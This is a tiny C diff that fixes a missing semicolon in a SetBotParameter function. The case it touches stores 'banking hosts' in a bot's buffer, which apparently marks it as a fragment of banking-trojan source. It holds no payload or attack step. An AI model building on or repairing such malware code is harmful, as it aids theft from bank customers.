@@ -779,7 +779,7 @@ BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
 			case BOT_PARAM_BANKINGHOSTS:
 				{
 					Buf = BOT_BANKHOSTS_ARRAY;
-					Max = MAX_BANKHOSTS_BUF_SIZE
+					Max = MAX_BANKHOSTS_BUF_SIZE;
 					break;
 				}
 
